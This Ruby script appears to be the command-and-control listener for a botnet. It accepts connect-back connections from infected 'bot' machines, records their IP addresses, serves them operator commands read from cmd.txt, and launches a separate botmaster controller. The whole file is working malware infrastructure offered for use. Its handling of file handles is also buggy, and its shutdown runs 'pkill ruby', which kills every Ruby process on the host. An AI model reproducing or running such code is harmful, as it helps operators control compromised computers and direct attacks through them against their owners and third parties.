#!/usr/bin/env ruby
require 'socket'

def local_ip
  orig = Socket.do_not_reverse_lookup
  Socket.do_not_reverse_lookup = true # turn off reverse DNS resolution temporarily
  UDPSocket.open do |s|
    s.connect '64.233.187.99', 1 #google
    s.addr.last
  end
ensure
  Socket.do_not_reverse_lookup = orig
end

begin

  port = 8080  # This has to be the same port that the bot is connecting back to
  masterport = 45678
  locip = local_ip  # If we aren't connected to the outernet

  puts "
  _______ _______ ______ _______
  |     __|       |   __ \\   _   |
  |__     |   -   |      <       |
  |_______|_______|___|__|___|___|

  Made with <3 by AM-77

  To stop the server, type CTRL+C\n\n"
  puts "[!] Starting bot listener on #{locip}:#{port}"
  server = TCPServer.new("", port)

  # Always override previous file
  cmdf = File.new("cmd.txt", 'w')
  cmdf.puts("NONE")
  cmdf.close
  puts "[!] Starting botmaster listener on port #{masterport}..."
  system("ruby botmaster.rb #{masterport} &")  # CHANGE THIS

  bot_file = File.new("bots.txt", 'a+')

  # Create the HTTP response
  cmd_file_read = File.new("cmd.txt", 'r')

  response = cmd_file_read.read

  res =  "HTTP/1.1 200 OK\r\n"
  res += "Content-Type: text/plain\r\n"
  res += "Content-Length: #{response.bytesize}\r\n"
  res += "Connection: close\r\n"
  res += "\r\n"
  res += response

  loop do
    Thread.start(server.accept) do |socket|

      # Write response but don't write to bot file
      if File.readlines("bots.txt").grep(/#{socket.peeraddr[3]}/).any?
        socket.write res
        puts "Old conn"
        socket.close
      end

      puts "[*] New bot connection from #{socket.peeraddr[3]}\n"
      bot_file.write("#{socket.peeraddr[3]}\n")
      bot_file.close

      request = socket.gets
      STDERR.puts request

      socket.print res

      # Close connections
      cmd_file_read.close
      socket.close

  end end
rescue Interrupt
  puts "Caught interrupt, closing all ruby instances"
  system('pkill ruby')
end
